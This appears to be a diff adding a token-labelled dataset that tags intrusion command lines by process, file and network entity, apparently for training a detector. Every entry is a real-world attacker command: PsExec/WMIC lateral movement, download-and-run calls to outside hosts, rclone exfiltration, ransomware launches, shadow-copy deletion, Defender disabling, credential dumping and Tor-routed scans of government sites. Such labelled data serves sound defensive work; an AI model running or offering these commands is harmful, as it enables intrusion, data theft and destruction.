+PsExec.exe	B-Process
+/accepteula	O
+-d	O
+\\REDACTED	B-Socket
+-u	O
+"domain.local\Administrator"	O
+-p	O
+"REDACTED"	O
+cmd	B-Process
+/c	O
+COPY	O
+/Y	O
+"\\REDACTED\share$\ds.exe"	B-File
+"%PUBLIC%\Music"	B-File
+
+PsExec.exe	B-Process
+/accepteula	O
+-d	O
+\\REDACTED	B-Socket
+-u	O
+"domain.local\Administrator"	O
+-p	O
+"REDACTED"	O
+cmd	B-Process
+/c	O
+COPY	O
+/Y	O
+"\\REDACTED\share$\ds.exe"	B-File
+%PUBLIC%\Music	B-File
+
+cmd	B-Process
+/c	O
+COPY	O
+/Y	O
+"\\REDACTED\share$\ds.exe"	B-File
+"%PUBLIC%\Music"	B-File
+
+cmd	B-Process
+/c	O
+COPY	O
+/Y	O
+"\\REDACTED\share$\ds.exe"	B-File
+%PUBLIC%\Music	B-File
+
+%WINDIR%\system32\cmd.exe	B-Process
+/c	O
+"C:\share$\WMI1.bat"	B-File
+
+cmd.exe	B-Process
+/c	O
+"bitsadmin	O
+/transfer	O
+ds	O
+"\\REDACTED\share$\ds.exe"	B-File
+"%APPDATA%\ds.exe"	B-File
+&&	O
+"%APPDATA%\ds.exe"	B-Process
+-pass	O
+REDACTED"	O
+
+C:\Windows\system32\cmd.exe	B-Process
+/c	O
+echo	B-Process
+0291f1e69dd	O
+>	O
+\\.\pipe\82afc1	B-Socket
+
+makecab	B-Process
+"C:\Users\<REDACTED>\AppData\Local\Temp\logFileuyovaqv.bin"	B-File
+C:\Users\<REDACTED>\AppData\Local\Temp\logFileuyovaqv.cab	B-File
+
+mshta	B-Process
+http://92.51.2[.]22:443/UsySLX1n.hta	B-Socket
+
+rundll32.exe	B-Process
+"C:\Users\REDACTED\AppData\Local\Temp\rate_x32.dat"	B-File
+,update	O
+/i:"LaborBetray\license.dat"	B-File
+
+cmd.exe B-Process
+/C O
+dir B-Process
+%HOMEDRIVE%%HOMEPATH% B-File
+
+cmd.exe B-Process
+/C O
+reg B-Process
+add O
+"hklm\system\currentControlSet\Control\Terminal B-File
+Server" I-File
+/v O
+"fDenyTSConnections" O
+/t O
+REG_DWORD O
+/d O
+0x0 O
+/f O
+
+cmd.exe B-Process
+/C O
+copy O
+192145.dll B-File
+\\<INTERNAL_IP>\ADMIN$ B-File
+/Y O
+/Z O
+
+psexec.exe B-Process
+-accepteula O
+-d O
+-s O
+\\<INTERNAL_IP> B-Socket
+rundll32.exe B-Process
+C:\windows\192145.dll,StartW B-File
+
+psexec.exe B-Process
+-accepteula O
+-d O
+-s O
+\\<INTERNAL_IP> B-Socket
+rundll32.exe B-Process
+C:\windows\192145.dll B-File
+,StartW O
+
+rclone.exe B-Process
+copy O
+--max-age O
+2y O
+"\\SERVER\Shares" B-File
+Mega:DATA O
+-q O
+--ignore-existing O
+--auto-confirm O
+--multi-thread-streams O
+7 O
+--transfers O
+7 O
+--bwlimit O
+10M O
+
+C:\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe B-Process
+-m O
+-net O
+-size O
+10 O
+-nomutex O
+-p O
+\\TARGETHOST\C$ B-File
+
+"C:\Windows\System32\schtasks.exe" B-Process
+/Create O
+/SC O
+MINUTE O
+/TN O
+"Update O
+service O
+for O
+Windows O
+Service" O
+/TR O
+"PowerShell.exe B-Process
+-ExecutionPolicy O
+bypass O
+-windowstyle O
+hidden O
+-File O
+C:\Users\Administrator\update.ps1" B-File
+/MO O
+30 O
+/F O
+
+"C:\Windows\System32\schtasks.exe" B-Process
+/Create O
+/SC O
+MINUTE O
+/TN O
+"Update O
+service O
+for O
+Windows O
+Service" O
+/TR O
+PowerShell.exe B-Process
+-ExecutionPolicy O
+bypass O
+-windowstyle O
+hidden O
+-File O
+C:\Users\Administrator\update.ps1 B-File
+
+find.exe B-Process
+-f O
+"(objectcategory=person)" O
+> O
+ad_users.txt B-File
+
+find.exe B-Process
+-f O
+"objectcategory=computer" O
+> O
+ad_computers.txt B-File
+
+find.exe B-Process
+-f O
+"(objectcategory=organizationalUnit)" O
+> O
+ad_ous.txt B-File
+
+find.exe B-Process
+-subnets O
+-f O
+(objectCategory=subnet)> O
+subnets.txt B-File
+
+find.exe B-Process
+-f O
+"(objectcategory=group)" O
+> O
+ad_group.txt B-File
+
+cmd.exe B-Process
+/c O
+C:\ProgramData\AnyDesk.exe B-Process
+--install O
+C:\ProgramData\AnyDesk B-File
+--start-with-win O
+--silent O
+
+cmd.exe B-Process
+/c O
+echo B-Process
+J9kzQ2Y0qO O
+| O
+C:\ProgramData\anydesk.exe B-Process
+--set-password O
+
+cmd.exe B-Process
+/c O
+C:\ProgramData\AnyDesk.exe B-Process
+--get-id O
+
+reg.exe B-Process
+add O
+hkcu\software\classes\ms-settings\shell\open\command B-File
+/ve O
+/d O
+"reg.exe B-Process
+save O
+hklm\sam B-File
+c:\ProgramData\sam.save" B-File
+/f O
+
+reg.exe B-Process
+add O
+hkcu\software\classes\ms-settings\shell\open\command B-File
+/v O
+"DelegateExecute" O
+/f O
+
+reg.exe B-Process
+add O
+hkcu\software\classes\ms-settings\shell\open\command B-File
+/ve O
+/d O
+"reg.exe B-Process
+save O
+hklm\security B-File
+c:\ProgramData\security.save" B-File
+/f O
+
+reg.exe B-Process
+add O
+hkcu\software\classes\ms-settings\shell\open\command B-File
+/ve O
+/d O
+"reg.exe B-Process
+save O
+hklm\system B-File
+c:\ProgramData\system.save" B-File
+/f O
+
+reg.exe B-Process
+delete O
+hkcu\software\classes\ms-settings B-File
+/f O
+>nul O
+2>&1 O
+
+"C:\Program B-Process
+Files\Microsoft I-Process
+SQL I-Process
+Server\Client I-Process
+SDK\ODBC\130\Tools\Binn\sqlcmd.exe" I-Process
+-S O
+localhost,51341 B-Socket
+-E O
+-y0 O
+-Q O
+"SELECT O
+TOP O
+(1000) O
+[id],[user_name],[password],[usn],[description],[visible],[change_time_utc]FROM O
+[VeeamBackup].[dbo].[Credentials];" O
+
+"C:\Windows\system32\NOTEPAD.EXE" B-Process
+C:\Windows\Microsoft.NET\Framework\<version#>\veeam1.cs.txt B-File
+
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe B-Process
+veeam1.cs.txt B-File
+
+qq.exe B-Process
+-f O
+"(objectcategory=person)" O
+
+qq.exe B-Process
+-f O
+"objectcategory=computer" O
+
+qq.exe B-Process
+-f O
+"(objectcategory=organizationalUnit)" O
+
+qq.exe B-Process
+-sc O
+trustdmp B-File
+
+qq.exe B-Process
+-f O
+(objectCategory=subnet) O
+
+qq.exe B-Process
+-f O
+"(objectcategory=group)" O
+
+sqlcmd B-Process
+-E O
+-S O
+localhost O
+-Q O
+"BACKUP O
+DATABASE O
+master O
+TO O
+DISK='c:\programdata\sql\master.bak'" B-File
+
+sc B-Process
+config O
+"Netbackup O
+Legacy O
+Network O
+service" O
+start= O
+disabled O
+
+vssadmin.exe B-Process
+Delete B-File
+Shadows I-File
+/all O
+/quiet O
+
+wmic.exe B-Process
+Shadowcopy B-File
+Delete I-File
+
+net B-Process
+stop O
+"Zoolz B-Process
+2 I-Process
+Service" I-Process
+/y O
+
+net B-Process
+stop O
+"Veeam B-Process
+Backup I-Process
+Catalog I-Process
+Data I-Process
+Service" I-Process
+/y O
+
+net B-Process
+stop O
+"Symantec B-Process
+System I-Process
+Recovery" I-Process
+/y O
+
+net B-Process
+stop O
+"Symantec B-Process
+System I-Process
+Recovery" I-Process
+/y O
+
+net B-Process
+stop O
+"SQLsafe B-Process
+Backup I-Process
+Service" I-Process
+/y O
+
+net B-Process
+stop O
+"SQL B-Process
+Backups" I-Process
+/y O
+
+net B-Process
+stop O
+"Acronis B-Process
+VSS I-Process
+Provider" I-Process
+/y O
+
+net B-Process
+stop O
+VeeamDeploySvc B-Process
+/y O
+
+net B-Process
+stop O
+BackupExecVSSProvider B-Process
+/y O
+
+net B-Process
+stop O
+BackupExecRPCService B-Process
+/y O
+
+net B-Process
+stop O
+BackupExecManagementService B-Process
+/y O
+
+net B-Process
+stop O
+BackupExecJobEngine B-Process
+/y O
+
+net B-Process
+stop O
+BackupExecDeviceMediaService B-Process
+/y O
+
+C:\Windows\System32\rundll32.exe B-Process
+C:/Windows/Temp//rvhz1.dll B-File
+DllRegisterServer O
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+C:\Users\USER~1\AppData\Local\Temp\J10B9.cmd B-File
+> O
+C:\Users\USER~1\AppData\Local\Temp\yp710BA.tmp B-File
+2> O
+C:\Users\USER~1\AppData\Local\Temp\1N10CB.tmp B-File
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe B-Process
+-Command O
+"(New-Object B-Socket
+Net.WebClient).DownloadFile('http://msa.org.in/app/webroot/js/kcfinder/js/AdFind.bin', I-Socket
+'c:\Users\Public\adfind.exe' B-File
+
+adfind B-Process
+-f O
+objectcategory=computer O
+-csv O
+name O
+cn O
+OperatingSystem O
+dNSHostName O
+> O
+some.csv B-File
+
+adfind B-Process
+-gcb O
+-sc O
+trustdmp O
+> O
+trustdmp.txt B-File
+
+pse.exe B-Process
+-accepteula O
+@a.txt B-File
+-c O
+-f O
+-d O
+-s O
+ufo.exe B-Process
+> O
+log.txt B-File
+
+"C:\Program B-Process B-Process
+Files\TacticalAgent\tacticalrmm.exe" I-Process
+-m O
+install O
+--api O
+https://api.floppasoftware[.]com B-Socket
+--client-id O
+1 O
+--site-id O
+1 O
+--agent-type O
+server O
+--auth O
+5bc5f5263224697ff9a653f8efa7e7d7a2ce341920a03c60e4823331b2508c O
+
+mstsc.exe B-Process
+/v:IP_ADDRESS_1 B-Socket
+
+mstsc.exe B-Process
+/v:IP_ADDRESS_2 B-Socket
+
+C:\Windows\SysWOW64\explorer.exe B-Process
+\\IP_ADDRESS_1\C$ B-Socket
+
+C:\Windows\SysWOW64\explorer.exe B-Process
+\\IP_ADDRESS_2\C$ B-Socket
+
+C:\Windows\System32\cmd.exe B-Process
+/c O
+rundll32.exe B-Process
+
+wmic B-Process
+/node:IP_Address O
+process O
+call O
+create O
+"cmd.exe B-Process
+/c O
+start O
+C:\Progradata\sc_https_x64.exe" B-File
+
+"C:\Program B-Process
+Files\TacticalAgent\tacticalrmm.exe" I-Process
+-m O
+install O
+--api O
+https://api.floppasoftware[.]com B-Socket
+--client-id O
+1 O
+--site-id O
+1 O
+--agent-type O
+server O
+--auth O
+REDACTED O
+
+rclone.exe B-Process
+copy O
+"\\SERVER.domain.name\path" B-File
+mega:1 B-Socket
+-q O
+--ignore-existing O
+--auto-confirm O
+--multi-thread-streams O
+6 O
+--transfers O
+6 O
+
+rclone.exe B-Process
+copy O
+"\\SERVER.domain.name\path" B-File
+mega:2 B-Socket
+-q O
+--ignore-existing O
+--auto-confirm O
+--multi-thread-streams O
+6 O
+--transfers O
+6 O
+
+rundll32.exe B-Process
+locker.dll,run B-File
+/TARGET=\\HOST1.DOMAIN.NAME\C$ B-Socket
+/TARGET=\\HOST2.DOMAIN.NAME\C$ B-Socket
+/TARGET=\\HOST3.DOMAIN.NAME\C$ B-Socket
+/login=DOMAIN\Administrator O
+/password=[REDACTED] O
+/nolog O
+/shareall O
+
+attrib B-Process
++s O
++h O
+/D O
+"C:\Program B-File
+Files\Windows I-File
+NT\*.*" I-File
+
+nltest B-Process
+/dclist:<DOMAINNAME>.local B-Socket
+
+WMIC B-Process
+/Node:localhost B-Socket
+/Namespace:\\root\SecurityCenter2 B-Socket
+Path O
+AntiVirusProduct O
+Get O
+displayName O
+/Format:List O
+
+"C:\Program Files\WinRAR\WinRAR.exe" B-Process
+a O
+-ep1 O
+-scul O
+-r0 O
+-iext O
+-imon1 O
+-- O
+. O
+G:\REDACTED B-File
+
+%WINDIR%\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/node:"REDACTED" B-Socket
+process O
+call O
+create O
+"%WINDIR%\Temp\svhost.exe B-Process
+"143.244.146[.]183"" B-Socket
+
+C:\Windows\System32\cmd.exe" B-Process
+/c O
+echo B-Process
+curl B-Process
+https://moashraya[.]com/out/t.php B-Socket
+--output O
+"%temp%\magni.waut.a" B-File
+--ssl O
+no-revoke O
+--insecure O
+--location O
+> O
+"%temp%\magni.w.bat B-File
+
+cmd.exe B-Process
+/c O
+"%temp%\magnu.w.bat" B-File
+
+cmd.exe B-Process
+/c O
+ren O
+"%temp%\magni.waut.a" B-File
+"magni.w" B-File
+
+rundll32 B-Process
+"%temp%\magni.w", B-File
+scab O
+\k O
+arabika752 O
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+echo B-Process
+00e4f7418cd O
+> O
+\\.\pipe\9090e9 B-Socket
+
+vol B-Process
+-f O
+[REDACTED].dmp B-File
+windows.memmap.Memmap O
+--dump O
+--pid O
+4860 O
+
+invokemodule B-Process
+-module O
+locker O
+-locker O
+<REDACTED>.dll B-File
+-lockerpath O
+programdata\microsoft B-File
+-lockertype O
+dll O
+-lockername O
+sysfunc O
+-lockerdeployonly O
+$true O
+-lockerentrypoint O
+run O
+-handlesystems O
+custom O
+
+powershell B-Process
+invoke-webrequest O
+-uri O
+http://mrassociattes.com/images/62.gif B-Socket
+-outfile O
+c:\programdata\COIm.jpg B-File
+
+C:\ProgramData\AnyDesk.exe B-Process
+--install O
+C:\ProgramData\Any B-File
+--start-with-win O
+--silent O
+
+adfind.exe B-Process
+-gcb O
+-sc O
+trustdmp O
+
+adfind.exe B-Process
+-f O
+"(objectcategory=group)" O
+
+adfind.exe B-Process
+-subnets O
+-f O
+(objectCategory=subnet) O
+
+adfind.exe B-Process
+-f O
+(objectcategory=organizationalUnit) O
+
+adfind.exe B-Process
+-f O
+objectcategory=computer O
+
+adfind.exe B-Process
+-f O
+(objectcategory=person) O
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+dir B-Process
+/s O
+/b O
+C:\Windows\system32\*htable.xsl B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+net B-Process
+group O
+"domain B-File
+Admins" I-File
+/domainroute O
+printwhoami O
+
+cmd.exe B-Process
+/c O
+C:\ProgramData\AnyDesk.exe B-Process
+--install O
+C:\ProgramData\Any B-File
+--start-with-win O
+--silent O
+
+cmd.exe B-Process
+/c O
+echo B-Process
+btc1000qwe123 O
+| O
+C:\ProgramData\Any\AnyDesk.exe B-Process
+--set-password O
+
+reg B-Process
+add O
+"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" B-File
+/v O
+InnLine O
+/t O
+REG_DWORD O
+/d O
+0 O
+/f O
+
+cmd.exe B-Process
+/C O
+C:\Recovery\AdFind.exe B-Process
+-f O
+objectcategory=computer O
+-csv O
+name O
+cn O
+OperatingSystem O
+dNSHostName O
+> O
+C:\Recovery\DOMAIN.csv B-File
+
+rundll32.exe B-Process
+c:\programdata\95.dll,TstSec B-File
+11985756 O
+
+powershell.exe B-Process
+-Command O
+PowerShell O
+-Command O
+"\"Get-CimInstance O
+Win32_ShadowCopy B-File
+| O
+Remove-CimInstance\"\"" O
+
+cmd.exe B-Process
+/c O
+vssadmin.exe B-Process
+Delete B-File
+Shadows I-File
+/all O
+/quiet O
+
+cmd.exe B-Process
+/c O
+""fsutil B-Process
+behavior O
+set O
+SymlinkEvaluation B-File
+R2L:1 O
+
+cmd.exe B-Process
+/c O
+""fsutil B-Process
+behavior O
+set O
+SymlinkEvaluation B-File
+R2R:1 O
+
+cmd.exe B-Process
+/c O
+wevtutil B-Process
+cl O
+security B-File
+
+cmd.exe B-Process
+/c O
+wevtutil B-Process
+cl O
+system B-File
+
+cmd.exe B-Process
+/c O
+wevtutil B-Process
+cl O
+application4 B-File
+
+lsadump::dcsync B-Process
+/domain:CHILD.DOMAIN.EXAMPLE B-Socket
+/user:DOMAINADMINUSER O
+/csv O
+> O
+CHILD.csv B-File
+
+rclone B-Process
+copy O
+[REDACTED]:/mnt/sdd/REDACTED B-File
+--include-from O
+include.txt B-File
+
+WMIC B-Process
+/Node:localhost B-Socket
+/Namespace:\\root\SecurityCenter2 B-File
+Path O
+AntiVirusProduct O
+Get O
+* O
+/Format:Listc O
+
+cmd.exe B-Process
+/C O
+dir B-Process
+*.txt B-File
+
+cmd.exe B-Process
+/C O
+dir B-Process
+*.dll B-File
+
+adfind.exe B-Process
+-f O
+(objectcategory=person) O
+> O
+ad_users.txt B-File
+
+adfind.exe B-Process
+-f O
+objectcategory=computer O
+> O
+ad_computers.txt B-File
+
+adfind.exe B-Process
+-f O
+(objectcategory=organizationalUnit) O
+> O
+ad_ous.txt B-File
+
+adfind.exe B-Process
+-subnets O
+-f O
+(objectCategory=subnet) O
+> O
+ad_subnets.txt B-File
+
+adfind.exe B-Process
+-gcb O
+-sc O
+trustdmp B-File
+> O
+ad_trustdmp.txt B-File
+
+del B-Process
+7.exe B-File
+adfind* B-File
+ad_* B-File
+
+psexec.exe B-Process
+\\[TARGET B-Socket
+IP] I-Socket
+-u O
+[DOMAIN]\[USER] O
+-p O
+"[PASSWORD]" O
+-s O
+-d O
+-h O
+-r O
+mstdc O
+-accepteula O
+-nobanner O
+c:\windows\temp\p.bat B-File
+
+wmic B-Process
+/node:"[TARGET B-Socket
+IP]" I-Socket
+/user:"[DOMAIN]\[USER]" O
+/password:"[PASSWORD]" O
+process O
+call O
+create O
+"cmd.exe B-Process
+/c O
+c:\windows\temp\p.bat" B-File
+
+cmd.exe B-Process
+/C O
+wmic B-Process
+/node:"servername.domainname" O
+process O
+call O
+create O
+"C:\PerfLogs\procdump.exe B-Process
+-accepteula O
+-ma O
+lsass O
+C:\PerfLogs\lsass.dmp" B-File
+
+cmd.exe B-Process
+/C O
+nltest B-Process
+/dclist:DOMAIN.local B-Socket
+
+cmd.exe B-Process
+/C O
+ping B-Process
+WORKSTATION B-Socket
+
+cmd.exe B-Process
+/C O
+net B-Process
+view O
+\\WORKSTATION B-Socket
+/all O
+
+cmd.exe B-Process
+/C O
+net B-Process
+view O
+\\DOMAINCONTROLLER B-Socket
+/all O
+
+powershell B-Process
+Invoke-WebRequest O
+"http://temp.sh/VSlAV/http64.exe" B-process
+-OutFile O
+C:\programdata\rr.exe B-File
+
+cmd.exe B-Process
+/c O
+chcp B-Process
+>&2 O
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+c:\windows\temp\1.bat B-File
+
+adfind.exe B-Process
+-f O
+(objectcategory=group) O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/node:"REDACTED" B-Socket
+/user:"USER" O
+/password:"REDACTED" O
+os O
+get O
+caption O
+
+C:\\Windows\\System32\\wbem\\wmic.exe B-Process
+/node:REDACTED B-Socket
+process O
+call O
+create O
+\""cmd.exe B-Process
+/c O
+powershell.exe B-Process
+-nop O
+-w O
+hidden O
+-c O
+\""\""IEX B-Socket
+((new-object I-Socket
+net.webclient).downloadstring('https://aicsoftware[.]com:757/coin'))\""\"" I-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/node:"REDACTED" B-Socket
+process O
+call O
+create O
+"c:\windows\system32\rundll32.exe B-Process
+c:\windows\temp\1.dll, B-File
+DllRegisterServer" O
+
+wmic B-Process
+/node:REDACTED B-Socket
+/user:DOMAIN\USER O
+/password:REDACTED O
+process O
+call O
+create O
+cmd.exe B-Process
+/c O
+copy O
+\\REDACTED\c$\windows\temp\p.bat B-File
+c:\windows\temp B-File
+
+cmd.exe B-Process
+/c O
+copy O
+\\REDACTED\c$\windows\temp\p.bat B-File
+c:\windows\temp\ B-File
+
+7.exe B-Process
+a O
+-mx3 O
+ad.7z B-File
+ad_* I-File
+
+wmic B-Process
+/node:"TARGET_HOST_IP" O
+/user:"DOMAIN\USER" O
+/password:"PASSWORD" O
+process O
+call O
+create O
+"cmd.exe B-Process
+/c O
+copy O
+\\SOURCE_SERVER_IP\c$\windows\temp\p.bat B-File
+c:\windows\temp\" B-File
+
+cmd.exe B-Process
+/c O
+copy O
+\\SOURCE_SERVER_IP\c$\windows\temp\k.exe B-File
+c:\windows\temp\ B-File
+
+psexec.exe B-Process
+\\TARGET_HOST_IP B-Socket
+-u O
+DOMAIN\USER O
+-p O
+"PASSWORD" O
+-s O
+-d O
+-h O
+-r O
+mstdc O
+-accepteula O
+-nobanner O
+c:\windows\temp\p.bat B-File
+
+rundll32.exe B-Process
+"C:\Users\REDACTED\AppData\Local\REDACTED\ikaqkk.dll",update B-File
+/i:"TimberMule\license.dat" B-File
+
+regsvr32 B-Process
+C:\users\public\music\kaslose64.dll B-File
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="Webroot B-File
+SecureAnywhere" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="Symantec B-File
+Endpoint I-File
+Protection" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="AVG B-File
+2015" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="McAfee B-File
+VirusScan I-File
+Enterprise" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="McAfee B-File
+Agent" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="McAfee B-File
+DLP I-File
+Endpoint" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="McAfee B-File
+Endpoint I-File
+Security I-File
+Platform" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="McAfee B-File
+Endpoint I-File
+Security I-File
+Threat I-File
+Prevention" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="Microsoft B-File
+Security I-File
+Client" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="Malwarebytes' B-File
+Managed I-File
+Client" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="Sophos B-File
+System I-File
+Protection" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="Sophos B-File
+AutoUpdate" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="Sophos B-File
+Remote I-File
+Management I-File
+System" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="McAfee B-File
+SiteAdvisor I-File
+Enterprise" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="Symantec B-File
+Backup I-File
+Exec I-File
+Remote I-File
+Agent I-File
+for I-File
+Windows" I-File
+call O
+uninstall O
+/nointeractive O
+
+start B-Process
+wmic B-Process
+product O
+where O
+name="ESET B-File
+File I-File
+Security" I-File
+call O
+uninstall O
+/nointeractive O
+
+reg.exe B-Process
+ADD O
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System B-File
+/v O
+EnableLUA O
+/t O
+REG_DWORD O
+/d O
+0 O
+/f O
+
+powershell.exe B-Process
+Set-MpPreference B-Process
+-DisableRealtimeMonitoring O
+$true O
+
+powershell.exe B-Process
+Uninstall-WindowsFeature B-Process
+-Name O
+Windows-Defender B-File
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender" I-File
+/v O
+DisableAntiSpyware O
+/t O
+REG_DWORD O
+/d O
+1 O
+/f O
+
+reg B-Process
+delete O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender" I-File
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender" I-File
+/v O
+"DisableAntiSpyware" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender" I-File
+/v O
+"DisableAntiVirus" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\MpEngine" I-File
+/v O
+"MpEnablePus" O
+/t O
+REG_DWORD O
+/d O
+"0" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableBehaviorMonitoring" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableIOAVProtection" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableOnAccessProtection" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableRealtimeMonitoring" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableScanOnRealtimeEnable" B-File
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Reporting" I-File
+/v O
+"DisableEnhancedNotifications" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\SpyNet" I-File
+/v O
+"DisableBlockAtFirstSeen" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\SpyNet" I-File
+/v O
+"SpynetReporting" O
+/t O
+REG_DWORD O
+/d O
+"0" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\SpyNet" I-File
+/v O
+"SubmitSamplesConsent" O
+/t O
+REG_DWORD O
+/d O
+"0" O
+/f O
+
+cmd.exe B-Process
+/C O
+ping B-Process
+-n O
+1 O
+<redacted> O
+
+cmd.exe B-Process
+/C O
+nltest B-Process
+/domain_trusts&nltest O
+/dclist:\&c:\windows\sysnative\nltest O
+/domain_trusts\&c:\windows\sysnative\nltest O
+/dclist: O
+
+cmd.exe B-Process
+/C O
+nltest B-Process
+/domain_trusts&nltest O
+/dclist:&c:\windows\sysnative\nltest O
+/domain_trusts\&c:\windows\sysnative\nltest O
+/dclist: O
+
+cmd.exe B-Process
+/C O
+netstat B-Process
+-a O
+-n O
+-p O
+tcp O
+| O
+find B-Process
+"ESTAB" O
+
+nuclei B-Process
+-l O
+sept24.txt B-File
+-o O
+sept24_op.txt B-File
+-s O
+critical,high O
+
+nuclei B-Process
+-l O
+sept24.txt B-File
+-o O
+sept24_op.txt B-File
+-s O
+medium O
+
+nuclei B-Process
+-l O
+telco_again_subfinder B-File
+-o O
+telco_again_subfinder_nuclei_scan B-File
+-as O
+
+nuclei B-Process
+-l O
+rac_drdo_il_govnet B-File
+-o O
+rac_drdo_il_govnet B-File
+-s O
+critical,high O
+
+nuclei B-Process
+-l O
+co_nic_gov B-File
+-o O
+co_nic_gov_proxy_output B-File
+-s O
+critical O
+-proxy O
+socks5://localhost:1080 B-Socket
+
+torify B-Process
+nuclei B-Process
+-u O
+shabak.gov.il B-Socket
+-o O
+mossad.gov.il_new B-File
+
+torify B-Process
+nuclei B-Process
+-u O
+shabak.gov.il B-Socket
+-o O
+shabak.gov.il_new B-File
+
+torify B-Process
+nuclei B-Process
+-l O
+large_scope B-File
+-o O
+large_scope B-File
+-s O
+critical,high O
+
+torify B-Process
+nuclei B-Process
+-l O
+large_scope B-File
+-o O
+large_scope B-File
+-as O
+
+torify B-Process
+sqlmap B-Process
+-u O
+https://<domain>.gov.bd/admin/manage_user.php?id=1 B-Socket
+-v O
+2 O
+--delay O
+1.7 O
+--time-sec O
+13 O
+--tamper O
+space2comment O
+--risk O
+3 O
+--level O
+5 O
+--random-agent O
+--no-cast O
+--parse-errors O
+--dbs O
+
+torify B-Process
+ghauri B-Process
+-u O
+"https://<domain>.<domain>.in/products/all-products?category=CATMAPF0CE" B-Socket
+--dbs O
+
+schtasks B-Process
+/create O
+/RL O
+HIGHEST O
+/RU O
+"NT AUTHORITY\SYSTEM" O
+/sc O
+minute O
+/mo O
+30 O
+/tn O
+"schdsWin" O
+/tr O
+"cmd.exe B-Process
+/C O
+certutil.exe B-Process
+-urlcache O
+-f O
+http://192.169.6.122:6770/svchost.exe B-Socket
+%systemdrive%\Windows\Temp\svchost.exe B-File
+& O
+%systemdrive%\Windows\Temp\svchost.exe B-File
+" O
+
+schtasks B-Process
+/run O
+/TN O
+"schdsWin" B-Process
+
+REG B-Process
+QUERY O
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender\Real-Time O
+Protection O
+/v O
+EnableLUA O
+
+New-ItemProperty B-Process
+-Path O
+"HKLM:\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender" I-File
+-Name O
+DisableAntiSpyware O
+-Value O
+1 O
+-PropertyType O
+DWORD O
+-Force O
+
+certutil.exe B-Process
+-urlcache O
+-split O
+-f O
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 B-Socket
+powershellintelmodule.ps1 B-File
+
